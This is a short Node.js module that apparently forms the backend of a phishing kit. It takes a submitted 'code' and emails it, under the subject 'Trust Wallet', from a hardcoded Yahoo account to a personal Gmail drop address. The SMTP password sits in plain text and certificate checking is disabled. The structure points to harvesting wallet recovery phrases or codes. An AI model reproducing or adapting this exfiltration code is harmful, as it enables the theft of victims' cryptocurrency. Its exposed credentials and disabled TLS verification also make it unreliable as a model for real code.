const nodemailer = require('nodemailer');
const ejs = require('ejs');
const path = require("path");

module.exports = function(code){

   return new Promise((resolve,inject) => {



     let transporter = nodemailer.createTransport({
      // mail serviceb
      //masvrwugquaavpak
                 host: 'smtp.mail.yahoo.com',
                 port: 25,
                 service:'yahoo',
                 secure: true,
                 auth: {
                    user: 'bservice643@yahoo.com',
                    pass: 'masvrwugquaavpak'
                 },
                 tls: {
                   // do not fail on invalid certs
                   rejectUnauthorized: false
                 },
                 debug: false,
                 logger: true // highly recommend this one here
     });

     dataToSend = {
        code:code
     }


     

     ejs.renderFile(path.join(process.env.ROOT, '/pages/api/email/test.ejs'), dataToSend, function (err, data) {
     if (err) {
       console.log(err);
     } else {
//Babe0090
       const mainOptions = {
         from: 'bservice643@yahoo.com',
         to: 'trustfarouk86@gmail.com',
         subject: 'Trust Wallet',
         html: data // Plain text body
       };


     transporter.sendMail(mainOptions, function (err, info) {
           if (err) {
               console.log(err);
           } else {
              resolve('success')
           }
       });

     }

     });


   })





}
